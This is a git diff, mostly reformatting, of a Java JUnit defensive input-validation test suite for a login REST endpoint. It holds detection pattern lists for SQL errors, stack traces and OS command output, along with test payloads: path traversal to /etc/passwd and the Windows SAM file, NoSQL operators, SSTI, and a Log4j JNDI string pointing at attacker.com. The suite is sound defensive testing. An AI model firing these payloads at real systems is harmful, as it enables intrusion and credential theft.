@@ -29,7 +29,8 @@ import static io.restassured.RestAssured.given;
 import static org.junit.jupiter.api.Assertions.*;
 
 /**
- * Automated Security & Defensive Input-Validation Test Suite for REST API Endpoint:
+ * Automated Security & Defensive Input-Validation Test Suite for REST API
+ * Endpoint:
  * POST /test-login
  *
  * Parameters under test:
@@ -37,27 +38,34 @@ import static org.junit.jupiter.api.Assertions.*;
  * - @RequestParam("password") String password
  *
  * Assertions verified on every test:
- * 1. Safe 4xx status code returned (400 Bad Request, 401 Unauthorized, 403 Forbidden, 422 Unprocessable Entity).
+ * 1. Safe 4xx status code returned (400 Bad Request, 401 Unauthorized, 403
+ * Forbidden, 422 Unprocessable Entity).
  * 2. Never 200 OK (no authentication bypass or acceptance of malicious input).
- * 3. Never 5xx (no unhandled server exceptions, crashes, or unhandled 500 errors).
- * 4. Response body contains no SQL syntax errors, database artifacts, or ORM leaks.
- * 5. Response body contains no stack traces, Java/Spring internals, or debug information.
- * 6. Response body contains no OS command output (e.g., uid=, root:, directory listings).
- * 7. Results logged with timestamp, payload, status code, response time, and pass/fail to a .log file.
+ * 3. Never 5xx (no unhandled server exceptions, crashes, or unhandled 500
+ * errors).
+ * 4. Response body contains no SQL syntax errors, database artifacts, or ORM
+ * leaks.
+ * 5. Response body contains no stack traces, Java/Spring internals, or debug
+ * information.
+ * 6. Response body contains no OS command output (e.g., uid=, root:, directory
+ * listings).
+ * 7. Results logged with timestamp, payload, status code, response time, and
+ * pass/fail to a .log file.
  */
 @DisplayName("Defensive Security Input Validation Suite - POST /test-login")
 public class FirstTest {
 
-    // Configurable endpoint target (Override via -Dapi.base.url=http://localhost:8080)
-    public static final String DEFAULT_BASE_URL = System.getProperty("api.base.url", "http://localhost:8080");
-    public static final String ENDPOINT = "/auth/test-login";
+    // Reusable configuration centralized in ApiConfig (No duplicate base URL)
+    public static final String DEFAULT_BASE_URL = ApiConfig.getBaseUrl();
+    public static final String ENDPOINT = ApiConfig.LOGIN_ENDPOINT;
     public static final String LOG_FILE_PATH = "security_test_results.log";
 
     // Valid baseline test fixtures
-    public static final Long VALID_BIO_ID = 1001L;
-    public static final String VALID_PASSWORD = "ValidSecurePassword123!";
+    public static final Long VALID_BIO_ID = ApiConfig.VALID_BIO_ID;
+    public static final String VALID_PASSWORD = ApiConfig.VALID_PASSWORD;
 
-    // Sentinel to denote a parameter that should be intentionally omitted from the request
+    // Sentinel to denote a parameter that should be intentionally omitted from the
+    // request
     public static final Object OMITTED_PARAM = new Object();
 
     // Security leak detection patterns
@@ -66,8 +74,7 @@ public class FirstTest {
             "unclosed quotation mark", "hibernate", "jdbc",
             "ora-", "mysql", "postgresql", "sqlite3",
             "preparedstatement", "table \"users\"", "column not found",
-            "check the manual that corresponds to your mysql", "pg_catalog"
-    );
+            "check the manual that corresponds to your mysql", "pg_catalog");
 
     private static final List<String> STACK_TRACE_PATTERNS = List.of(
             "exception in thread", "at org.springframework.",
@@ -75,26 +82,22 @@ public class FirstTest {
             "nullpointerexception", "illegalargumentexception",
             "numberformatexception", "methodargumenttypemismatchexception",
             "constraintviolationexception", "whitelabel error page",
-            "internal server error", "org.apache.catalina", "org.apache.tomcat"
-    );
+            "internal server error", "org.apache.catalina", "org.apache.tomcat");
 
     private static final List<String> COMMAND_OUTPUT_PATTERNS = List.of(
             "uid=", "gid=", "root:", "daemon:", "/bin/sh", "/bin/bash",
             "nt authority\\system", "volume serial number",
             "[boot loader]", "windows ip configuration", "directory of c:\\",
-            "bytes free"
-    );
+            "bytes free");
 
     private static final List<String> AUTH_BYPASS_PATTERNS = List.of(
             "\"authenticated\":true", "\"authenticated\": true",
             "\"authenticated\":\"true\"", "\"status\":\"success\"",
             "\"status\": \"success\"", "\"loginsuccess\":true",
             "\"token\":", "\"jwt\":", "\"accesstoken\":",
-            "\"bearer \""
-    );
+            "\"bearer \"");
 
-    private static final DateTimeFormatter TIMESTAMP_FORMATTER =
-            DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss.SSS");
+    private static final DateTimeFormatter TIMESTAMP_FORMATTER = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss.SSS");
 
     @BeforeAll
     public static void setup() {
@@ -126,13 +129,13 @@ public class FirstTest {
      * and asserts safe 4xx response with no sensitive data leaks.
      */
     protected static Response executeAndValidate(Object bioId, Object password,
-                                                 String category, String payloadDescription) {
+            String category, String payloadDescription) {
         return executeAndValidateWithExtras(bioId, password, Collections.emptyMap(), category, payloadDescription);
     }
 
     protected static Response executeAndValidateWithExtras(Object bioId, Object password,
-                                                           Map<String, Object> extraParams,
-                                                           String category, String payloadDescription) {
+            Map<String, Object> extraParams,
+            String category, String payloadDescription) {
         long startTime = System.currentTimeMillis();
         Response response = null;
         List<String> violations = new ArrayList<>();
@@ -149,7 +152,6 @@ public class FirstTest {
             if (bioId != OMITTED_PARAM) {
                 if (bioId != null) {
                     request.formParam("bioId", bioId);
-                    request.param("bioId", bioId);
                     requestParamsSent.put("bioId", String.valueOf(bioId));
                 } else {
                     request.formParam("bioId", "");
@@ -163,7 +165,6 @@ public class FirstTest {
             if (password != OMITTED_PARAM) {
                 if (password != null) {
                     request.formParam("password", password);
-                    request.param("password", password);
                     requestParamsSent.put("password", String.valueOf(password));
                 } else {
                     request.formParam("password", "");
@@ -207,19 +208,22 @@ public class FirstTest {
 
             for (String pattern : STACK_TRACE_PATTERNS) {
                 if (lowerBody.contains(pattern.toLowerCase())) {
-                    violations.add("STACK TRACE LEAK: Response body exposes internal exception/stack trace: '" + pattern + "'");
+                    violations.add("STACK TRACE LEAK: Response body exposes internal exception/stack trace: '" + pattern
+                            + "'");
                 }
             }
 
             for (String pattern : COMMAND_OUTPUT_PATTERNS) {
                 if (lowerBody.contains(pattern.toLowerCase())) {
-                    violations.add("COMMAND OUTPUT LEAK: Response body exposes OS command output artifact: '" + pattern + "'");
+                    violations.add(
+                            "COMMAND OUTPUT LEAK: Response body exposes OS command output artifact: '" + pattern + "'");
                 }
             }
 
             for (String pattern : AUTH_BYPASS_PATTERNS) {
                 if (lowerBody.contains(pattern.toLowerCase())) {
-                    violations.add("AUTH TOKEN LEAK: Response body contains authentication success/token payload: '" + pattern + "'");
+                    violations.add("AUTH TOKEN LEAK: Response body contains authentication success/token payload: '"
+                            + pattern + "'");
                 }
             }
 
@@ -239,7 +243,8 @@ public class FirstTest {
                 requestTransport, requestParamsSent, violations, responseBody);
 
         assertTrue(passed,
-                String.format("Security Test Failed! Category: [%s] | Payload: [%s]%nRequest Params: %s%nViolations:%n - %s%nResponse Status: %d%nResponse Body: %s",
+                String.format(
+                        "Security Test Failed! Category: [%s] | Payload: [%s]%nRequest Params: %s%nViolations:%n - %s%nResponse Status: %d%nResponse Body: %s",
                         category, payloadDescription, requestParamsSent,
                         String.join(System.lineSeparator() + " - ", violations),
                         statusCode, truncate(responseBody, 250)));
@@ -260,9 +265,9 @@ public class FirstTest {
     }
 
     private static synchronized void logResult(boolean passed, int statusCode, long responseTime,
-                                               String category, String payloadDescription,
-                                               String requestTransport, Map<String, String> requestParamsSent,
-                                               List<String> violations, String responseBody) {
+            String category, String payloadDescription,
+            String requestTransport, Map<String, String> requestParamsSent,
+            List<String> violations, String responseBody) {
         String timestamp = LocalDateTime.now().format(TIMESTAMP_FORMATTER);
         String resultStr = passed ? "PASS" : "FAIL";
         String statusStr = statusCode > 0 ? "HTTP " + statusCode : "ERR/NONE";
@@ -296,8 +301,7 @@ public class FirstTest {
             writer.println("    Endpoint & Transport: " + requestTransport);
             writer.println("    Request Params Sent:");
             if (requestParamsSent != null && !requestParamsSent.isEmpty()) {
-                requestParamsSent.forEach((k, v) ->
-                        writer.printf("      * %-14s = %s%n", k, formatParamValue(v)));
+                requestParamsSent.forEach((k, v) -> writer.printf("      * %-14s = %s%n", k, formatParamValue(v)));
             } else {
                 writer.println("      * (None)");
             }
@@ -322,7 +326,8 @@ public class FirstTest {
         StringBuilder sb = new StringBuilder("{");
         boolean first = true;
         for (Map.Entry<String, String> entry : params.entrySet()) {
-            if (!first) sb.append(", ");
+            if (!first)
+                sb.append(", ");
             sb.append(entry.getKey()).append("=").append(truncate(entry.getValue(), 60));
             first = false;
         }
@@ -331,7 +336,8 @@ public class FirstTest {
     }
 
     private static String formatParamValue(String val) {
-        if (val == null) return "null";
+        if (val == null)
+            return "null";
         if (val.length() > 200) {
             return val.substring(0, 150) + "... [truncated: " + val.length() + " chars total]";
         }
@@ -350,9 +356,11 @@ public class FirstTest {
     }
 
     private static String truncate(String text, int maxLength) {
-        if (text == null) return "null";
+        if (text == null)
+            return "null";
         String clean = text.replace("\r", " ").replace("\n", " ");
-        if (clean.length() <= maxLength) return clean;
+        if (clean.length() <= maxLength)
+            return clean;
         return clean.substring(0, maxLength) + "... (truncated)";
     }
 
@@ -542,10 +550,10 @@ public class FirstTest {
                 "こんにちは世界",
                 "مرحبا بالعالم",
                 "Здравствуйте",
-                "admin\u0000password",                   // Null byte injection
-                "\u202Ereversed_password",              // Right-to-Left Override (RLO)
-                "test\uFEFFpassword",                   // Zero-width non-breaking space
-                "§±!@#$%^&*()_+-=[]{}|;':\",./<>?`~"    // Special punctuation set
+                "admin\u0000password", // Null byte injection
+                "\u202Ereversed_password", // Right-to-Left Override (RLO)
+                "test\uFEFFpassword", // Zero-width non-breaking space
+                "§±!@#$%^&*()_+-=[]{}|;':\",./<>?`~" // Special punctuation set
         })
         @DisplayName("Verify Unicode, emojis, RTL characters, and null bytes are handled safely")
         void testUnicodeAndSpecialCharsets(String specialPayload) {
@@ -556,7 +564,7 @@ public class FirstTest {
         @ValueSource(strings = {
                 "{\"bioId\": 1001, \"password\": \"secret\"}",
                 "{\"admin\": true}",
-                "{\"$gt\": \"\"}",                      // NoSQL injection payload
+                "{\"$gt\": \"\"}", // NoSQL injection payload
                 "{\"$ne\": null}",
                 "[1, 2, 3]",
                 "{\"bioId\": [1, 2], \"role\": \"ADMIN\"}",
@@ -570,12 +578,12 @@ public class FirstTest {
 
         @ParameterizedTest(name = "Format string & Path traversal: {0}")
         @ValueSource(strings = {
-                "%s%s%s%s%s%n%x%d",                     // C-style format string injection
-                "%00",                                   // URL-encoded null byte
-                "../../../../../../etc/passwd",          // Path traversal
+                "%s%s%s%s%s%n%x%d", // C-style format string injection
+                "%00", // URL-encoded null byte
+                "../../../../../../etc/passwd", // Path traversal
                 "..\\..\\..\\..\\windows\\system32\\config\\SAM",
                 "${jndi:ldap://attacker.com/malicious}", // Log4j / JNDI injection
-                "${7*7}",                                // Server-Side Template Injection (SSTI)
+                "${7*7}", // Server-Side Template Injection (SSTI)
                 "#{7*7}"
         })
         @DisplayName("Verify format strings, path traversals, and JNDI/SSTI payloads are safely rejected")
@@ -596,12 +604,12 @@ public class FirstTest {
                 "invalidBioId",
                 "abc123",
                 "true",
-                "1234.5678",                             // Floating point value
+                "1234.5678", // Floating point value
                 "NaN",
                 "Infinity",
                 "!@#$%^&*()",
                 "1001 2002",
-                "0x7B",                                  // Hexadecimal notation
+                "0x7B", // Hexadecimal notation
                 "99999999999999999999999999999999999999999999999999999999999" // Out of Long range
         })
         @DisplayName("Verify alphanumeric and out-of-range bioId strings return 4xx (400 Bad Request)")
@@ -752,10 +760,12 @@ public class FirstTest {
     }
 
     // =========================================================================
-    // PROGRAMMATIC LAUNCHER (Allows running via 'mvn exec:java' or 'java FirstTest')
+    // PROGRAMMATIC LAUNCHER (Allows running via 'mvn exec:java' or 'java
+    // FirstTest')
     // =========================================================================
     public static void main(String[] args) {
-        // Retrieve filter from command line arguments or system property (-Dtest=... or -Dfilter=...)
+        // Retrieve filter from command line arguments or system property (-Dtest=... or
+        // -Dfilter=...)
         String filter = null;
         if (args != null && args.length > 0 && !args[0].isBlank()) {
             filter = args[0].trim();
@@ -798,7 +808,8 @@ public class FirstTest {
         TestExecutionSummary summary = listener.getSummary();
         System.out.println();
         System.out.println("========================================================================================");
-        System.out.println("SECURITY TEST SUITE EXECUTION SUMMARY" + (filter != null ? " [FILTER: " + filter + "]" : ""));
+        System.out
+                .println("SECURITY TEST SUITE EXECUTION SUMMARY" + (filter != null ? " [FILTER: " + filter + "]" : ""));
         System.out.println("========================================================================================");
         System.out.println("Total Tests Found:      " + summary.getTestsFoundCount());
         System.out.println("Total Tests Started:    " + summary.getTestsStartedCount());
@@ -811,9 +822,11 @@ public class FirstTest {
         if (summary.getTestsStartedCount() == 0) {
             System.out.println("NOTE: No tests matched filter '" + filter + "'.");
             System.out.println("Hints:");
-            System.out.println(" - Category names: sql, xss, command, boundary, malformed, param, tampering, transport");
+            System.out
+                    .println(" - Category names: sql, xss, command, boundary, malformed, param, tampering, transport");
             System.out.println(" - Class names:    SqlInjectionTests, XssInjectionTests, CommandInjectionTests, etc.");
-            System.out.println(" - Method names:   testMissingBioIdParameter, testEmptyPassword, testOversizedPassword64KB, etc.");
+            System.out.println(
+                    " - Method names:   testMissingBioIdParameter, testEmptyPassword, testOversizedPassword64KB, etc.");
         }
 
         if (summary.getTestsFailedCount() > 0) {
